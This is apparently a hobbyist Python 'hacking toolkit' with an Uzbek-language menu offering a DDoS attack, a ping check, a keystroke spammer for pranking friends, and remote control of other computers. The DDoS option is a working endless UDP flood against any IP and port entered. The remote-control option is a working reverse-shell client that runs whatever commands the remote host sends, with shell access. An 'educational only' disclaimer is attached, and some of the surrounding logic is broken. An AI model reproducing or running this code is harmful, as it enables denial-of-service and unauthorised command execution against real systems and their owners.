try:
  import datetime as dt
  import time
  import platform
  from art import tprint
  import socket,os,time,random 
  import pyautogui
  import subprocess
except ImportError:
  print("Not installed Script packages..")
  time.sleep(2)
  print("Checking...")
  
  
print(r"""
___ ___ ___      _____     ___ ____ ___    ______      _____     _____       ____   ___
|   |   |   |   | ____|   |   |    |   |   |   _ \     |  |\ \   |  ____|    |    | /  /
|   |   |   |   | |____   |   |    |   |   |  | | \    |  | \ \  |  |        |    |/  /
|   |___|   |   |____  |  |   |____|   |   |  | |  \   |  | / /  |  _____    |    |  /
|   |___|   |        | |  |   |____|   |   |  | |  |   |  |/ /   |  _____|   |    |/ \
|   |   |   |        | |  |   |    |   |   |  |/  /    |  |\ \   |  |        |    |\  \
|   |   |   |	_____| |  |   |    |   |   |     /     |  | \ \  |  |_____   |    | \  \
____    ____   ________|   ___      ____   |____/      |__| /_/  _________|  |____|  \__\
 """)  
x = platform.system()
print(f"Systema turi {x}")


x = dt.datetime.now()
# print(x)
vaqt = dt.datetime.now()
yil = x.year
kun = x.strftime("%A")

print(f"Hozirgi yil {yil}")
print(f"Hozirgi soat {vaqt}")

print("\n****************************************************************")
print("\n* Cyber security,Android and telegram bot,SQLMap                *")
print("\n* INSHAALLAX DATA SCIENST                                       *")
print("\n* Asadbek Abdubannopov..  All rights reserved                   *")
print("\n         [1] - DDOS hujum                                       *")
print("\n         [2] - PING script                                      *")
print("\n         [3] - Do'stlarni lol qoldirish                         *")
print("\n         [4] - Boshqa kompyuterlarga ulanib boshqarish          *")
print("\n****************************************************************")


def tanla1():
    print("Downloaded....")
answer = int(input("Tanlang:  "))
if answer == 1:
    print("DDoS hujum tanlandi...")
    time.sleep(5)
    os.system('cls')
    os.system('clear')
    print("DDOS tanlandi. Muvaffiqyatli")
    print("Bu o'quv maqsadida holos. Har kim qilayotgan ishiga o'zi javob beradi.\nSiz qilayotgan ishingizga dasturchi aybdor emas!")
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    packet=random._urandom(21110)

    port=int(input("--[#]-- Istalgan portingizni kiriting:  "))

    ip=input("--[#]-- Nishon IP adressini kiritning:  ")

    sent=0

    while True:
       s.sendto(packet,(ip,port))
       sent+=1
       print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port,ip,sent))
if answer == 2:
    os.system("cls")
    os.system("clear")
    print("PING script ishga tushdi.")    
    ip_list = input("IP-ni kiriting\nMasalan: 192.168.1.1\n>>")


    request = ConnectionError()
    response = os.popen(f"Ping {ip_list}").read()
    if request == response:
        print("No internet connection")
     
    if "Reseived = 4" in response:
        print(f"DOWN {ip_list} Ping reponse kelmayapti")
    else:
        print(f"Up {ip_list} Ping muvaffiqiyatli")
        print(response)
        print(request)

if answer == 3:
    os.system('cls')
    os.system('clear')
    print("Cheksiz so'zlar yozib do'stlaringizni lol qoldiring!")
    print("Ishlamoqda.....")

    def sms_jonat():
       xabar = input("Xabar yozing\n>>")
       nechta = 10000
       time.sleep(10)
    xabar = input("Xabar yozing\n>>")
    nechta = 10000
    for i in range(nechta):
        pass
    while nechta > 0:
        nechta -=1
    
        pyautogui.typewrite(xabar.strip())
        pyautogui.press('enter')
        
    sms_jonat()        
if answer == 4:
    os.system('cls')
    os.system('clear')
    print("Ishga tushdi..")
    server = socket.socket()
    host = str(input("Kompyuterdi IP sini yozing:  "))   ## shu kopni ip adresssi
    if OSError:
        print("No internet connection!")
        os.system('exit')
    port = int(input("Portini kiriting:  "))
    server.connect((host, port))
    if socket.gaierror:
        print("No internet connection")
    run = True
    while run:

        xabar = server.recv(1024)
        result = subprocess.call(xabar.decode('UTF-8'),shell=True,universal_newlines=True)   ## command prompt windows terminal
        # result = subprocess.call(xabar.decode('UTF-8'), shell=True, universal_newlines=True)
        result = str(result)
        server.send('Qurbon online holatda ->>>'.encode('UTF-8'))


tanla1()




















